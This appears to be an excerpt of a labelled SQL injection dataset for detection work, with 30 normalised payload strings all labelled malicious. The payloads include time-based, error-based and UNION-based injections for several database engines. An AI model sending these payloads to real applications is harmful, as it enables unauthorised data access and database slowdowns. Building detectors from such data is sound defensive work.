row_index,payload_norm,label,sqli_type_hint
3600,"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
3601,1'+ ( select zpdf where 2938 = 2938,1,
3602,"1"" where 3247 = 3247 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3603,select ( case when ( 5796 = 8326 ) then 5796 else 5796* ( select 5796 from information_schema.character_sets ) end ) #,1,
3604,"-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
3605,1'+ ( select gthp where 7311 = 7311 or sleep ( 5 ) #,1,
3606,"1"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
3607,"-3278' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'zxig' like 'zxig",1,
3608,"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""vudj"" like ""vudj",1,
3609,"1"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
3610,"1"" ) ) as dksq where 7161 = 7161",1,
3611,"-6279' ) union all select 3026,3026,3026,3026,3026,3026,3026,3026--",1,
3612,"-9566%"" ) union all select 7973,7973,7973,7973--",1,
3613,"1 ) ) and elt ( 9288 = 6067,6067 ) and ( ( 1895 = 1895",1,
3614,"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ayqn' like 'ayqn",1,
3615,"1'|| ( select 'xpjg' where 3036 = 3036 and elt ( 1832 = 6644,6644 ) ) ||'",1,
3616,"1 ) ) as debc where 7428 = 7428 union all select null,null,null#",1,
3617,"1 and make_set ( 8403 = 8403,8899 )",1,
3618,"1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #",1,
3619,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",1,
3620,select pg_sleep ( 5 ) and 'zfyy' = 'zfyy,1,
3621,"-2549' ) as zfnf where 1993 = 1993 union all select 1993,1993,1993,1993,1993,1993--",1,
3622,1 and 9412 = 6877#,1,
3623,"-4541"" ) ) or make_set ( 4821 = 5233,5233 ) and ( ( ""xfex"" = ""xfex",1,
3624,"1%' ) ) ) union all select null,null,null,null,null,null#",1,
3625,"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""vhey"" = ""vhey",1,
3626,1 ) and 8417 = 5276#,1,
3627,"-2140 ) ) union all select 8174,8174,8174#",1,
3628,"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""%"" = """,1,
3629,"-2167' ) ) ) union all select 3804,3804,3804,3804,3804,3804#",1,
